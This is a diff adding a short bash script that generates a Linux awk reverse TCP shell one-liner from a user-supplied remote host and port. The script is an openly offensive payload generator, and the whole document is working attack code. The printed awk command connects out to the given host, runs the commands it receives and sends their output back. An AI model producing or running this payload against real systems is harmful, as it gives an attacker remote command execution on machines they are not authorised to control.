@@ -1,0 +1,21 @@
+#!/bin/bash
+
+function Craft_linux_awk_reverse_shell(){
+
+        if [ -z "$1" ] || [ -z "$2" ]
+        then
+                printf "Auto-gen Linux awk reverse tcp shell\n"
+                printf "Usage bash linux_awk-reverse-tcp <rhost> <rport>\n"
+                exit
+        fi
+
+        rhost="$1"
+        rport="$2"
+
+        printf "\n"
+	printf "awk 'BEGIN {s = \"/inet/tcp/0/$rhost/$rport\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print \$0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null"
+        printf "\n\n[\e[0;32m+\e[0m] Payload created.\n"
+
+}
+
+Craft_linux_awk_reverse_shell "$1" "$2"
